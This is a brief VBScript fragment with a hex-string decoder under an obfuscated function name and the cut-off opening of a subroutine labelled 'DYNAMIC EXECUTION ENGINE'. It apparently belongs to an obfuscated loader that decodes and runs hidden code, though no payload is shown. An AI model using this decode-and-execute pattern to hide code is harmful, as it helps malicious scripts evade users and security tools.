'[CORE DECODER WITH UNIQUE NAMES]
Function x1x1x1(sInput)
    Dim sOutput, iPos
    sOutput = ""
    For iPos = 1 To Len(sInput) Step 2
        sOutput = sOutput & Chr(CLng("&H" & Mid(sInput, iPos, 2)))
    Next
    x1x1x1 = sOutput
End Function

'[DYNAMIC EXECUTION ENGINE]
Sub x2x2x2(sFragments)
